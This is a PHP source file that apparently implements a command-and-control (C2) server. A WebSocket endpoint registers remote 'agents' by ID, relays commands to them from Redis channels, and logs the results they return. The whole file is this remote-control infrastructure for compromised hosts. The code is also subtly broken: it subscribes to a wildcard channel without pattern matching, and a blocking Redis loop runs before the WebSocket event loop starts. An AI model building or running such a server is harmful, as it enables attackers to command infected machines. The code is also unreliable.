#!/usr/bin/env php
<?php
require __DIR__ . '/../vendor/autoload.php';

use Ratchet\MessageComponentInterface;
use Ratchet\ConnectionInterface;
use Ratchet\Server\IoServer;
use Ratchet\Http\HttpServer;
use Ratchet\WebSocket\WsServer;
use App\Services\RedisService;

class C2WebSocket implements MessageComponentInterface
{
    protected $clients;
    protected $agentMap;

    public function __construct()
    {
        $this->clients = new \SplObjectStorage;
        $this->agentMap = [];
    }

    public function onOpen(ConnectionInterface $conn)
    {
        $query = $conn->httpRequest->getUri()->getQuery();
        parse_str($query, $params);
        if (!isset($params['agent_id']) || empty($params['agent_id'])) {
            $conn->close();
            return;
        }
        $agentId = $params['agent_id'];
        $this->clients->attach($conn, ['agent_id' => $agentId]);
        $this->agentMap[$agentId] = $conn;
        echo "Agent $agentId connected\n";
    }

    public function onMessage(ConnectionInterface $from, $msg)
    {
        $data = json_decode($msg, true);
        if (isset($data['command'])) {
            echo "Received command result: " . $data['command'] . "\n";
        }
    }

    public function onClose(ConnectionInterface $conn)
    {
        $this->clients->detach($conn);
        foreach ($this->agentMap as $agentId => $c) {
            if ($c === $conn) {
                unset($this->agentMap[$agentId]);
                echo "Agent $agentId disconnected\n";
                break;
            }
        }
    }

    public function onError(ConnectionInterface $conn, \Exception $e)
    {
        echo "Error: " . $e->getMessage() . "\n";
        $conn->close();
    }

    public function sendToAgent($agentId, $command)
    {
        if (isset($this->agentMap[$agentId])) {
            $this->agentMap[$agentId]->send(json_encode(['command' => $command]));
            return true;
        }
        return false;
    }
}

$loop = \React\EventLoop\Factory::create();
$socket = new \React\Socket\Server('0.0.0.0:8081', $loop);
$server = new IoServer(
    new HttpServer(
        new WsServer(
            $ws = new C2WebSocket()
        )
    ),
    $socket,
    $loop
);

$redis = new \Predis\Client();
$pubsub = $redis->pubSubLoop();
$pubsub->subscribe('agent:*');
foreach ($pubsub as $message) {
    $channel = $message->channel;
    $payload = json_decode($message->payload, true);
    if (strpos($channel, 'agent:') === 0) {
        $agentId = substr($channel, 6);
        if (isset($payload['command'])) {
            $ws->sendToAgent($agentId, $payload['command']);
        }
    }
}

echo "WebSocket server running on ws://0.0.0.0:8081\n";
$loop->run();
